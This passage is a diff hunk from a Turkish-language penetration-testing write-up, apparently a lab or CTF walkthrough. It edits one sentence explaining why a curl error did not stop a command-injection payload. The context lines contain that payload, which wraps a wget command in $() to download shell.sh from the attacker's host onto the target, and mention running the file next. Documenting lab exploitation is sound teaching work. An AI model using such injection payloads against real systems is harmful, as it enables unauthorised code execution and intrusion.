@@ -135,7 +135,7 @@ http://$(wget http://192.168.154.242:8000/shell.sh)
 <img width="1560" height="697" alt="shellgönderildi" src="https://github.com/user-attachments/assets/40fb62fe-3bb9-4629-b696-a50e3a1a956c" />
 
 
-Sayfa `curl: (3) URL using bad/illegal format or missing URL` hatası döndürse de, bu aslında normaldi — çünkü `$()` içindeki komut zaten çalışmış ve `shell.sh` dosyası hedef sunucuya inmişti. Hata mesajı sadece geri kalan (artık anlamsız) URL'nin curl tarafından reddedilmesinden kaynaklanıyordu.
+Sayfa `curl: (3) URL using bad/illegal format or missing URL` hatası döndürse de, bu aslında normaldi — çünkü `$()` içindeki komut zaten çalışmış ve `shell.sh` dosyası hedef sunucuya inmişti. Hata mesajı sadece geri kalan URL'nin curl tarafından reddedilmesinden kaynaklanıyordu.
 
 Ardından indirilen dosyayı çalıştırmak için aynı yöntemi tekrar kullandım:
 
